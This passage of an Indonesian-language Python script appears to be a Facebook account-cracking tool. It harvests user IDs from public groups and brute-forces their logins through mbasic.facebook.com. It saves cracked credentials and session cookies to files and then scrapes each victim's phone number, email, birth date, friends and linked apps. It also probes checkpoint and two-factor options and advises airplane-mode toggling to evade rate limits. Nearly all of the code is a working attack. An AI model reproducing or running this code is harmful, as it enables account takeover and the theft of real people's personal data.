					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					cek_apk(kuki)
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def lah():
	print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
	input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
	
def grup():
	win = '# PASTIKAN ID GROUP PUBLIK'
	win2 = mark(win, style='cyan')
	sol().print(win2)
	id = input(""+balmond+h+" \33[1;96mId Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print(balmond+m+" \33[1;33mKoneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan(balmond+m+" \33[1;33mGrup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print(""+balmond+p+" \33[1;32mNama Grup : "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+h+" Anggota : -")
	else:
		print(balmond+h+" Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \33[1;32mJika Stack, Mode Pesawat 5 Detik")
	print(balmond+m+" \33[1;32mSedang Mengumpulkan ID")
	print(balmond+m+" \33[1;32mTekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
	
# CEK APLIKASI 
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n  %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n   %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))

if __name__=='__main__':
	os.system('git pull')
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	login()
